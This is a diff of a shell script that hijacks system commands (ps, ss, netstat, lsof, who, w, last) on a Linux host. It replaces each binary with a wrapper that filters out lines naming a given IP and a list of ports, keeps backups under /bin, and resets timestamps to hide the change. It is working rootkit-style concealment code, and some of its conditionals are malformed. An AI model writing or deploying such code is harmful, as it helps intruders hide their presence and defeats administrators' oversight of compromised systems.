@@ -9,24 +9,26 @@ get_timestamp () {
 	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
 }
 
-PROCESSES="ps ss netstat lsof who w last"
-HIDDEN="malware|1337|1414|1415|1416|1417|5900|5901|5902|5903"
+COMMANDS="ps ss netstat lsof who w last"
+IP="10.10.2.4"
+IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP
+HIDE_ME="$IP_ESCAPED|1414|1415|1416|1417|59000|59001|59002|59003|60000|60001|60002|60003"
 
-bin_timestamp=`get_timestamp /bin`
-sbin_timestamp=`get_timestamp /sbin`
+bin_timestamp=$(get_timestamp /bin)
+sbin_timestamp=$(get_timestamp /sbin)
 
-for process in $PROCESSES; do
-	if `which $process`; then
-		process_path=`which $process`
+for process in $COMMANDS; do
+	if $(which $process); then
+		process_path=$(which $process)
 
 		if [ -f "/bin/bak${process}" ]; then
 			echo "[-] Binary '$process' has already been hijacked, skipping"
 		else
-			process_timestamp=`get_timestamp "$process_path"`
+			process_timestamp=$(get_timestamp "$process_path")
 			if [ ! cp "$process_path" "/bin/bak${process}" ]; then
 				echo "[!] Could not copy '$process_path' to '/bin/bak${process}', aborting"
 			else
-				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDDEN\"" > "$process_path" ]; then
+				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDE_ME\"" > "$process_path" ]; then
 					echo "[!] Could not write to '$process_path', restoring original binary..."
 					mv "/bin/bak${process}" "$process_path"
 					touch -t $process_timestamp "$process_path"
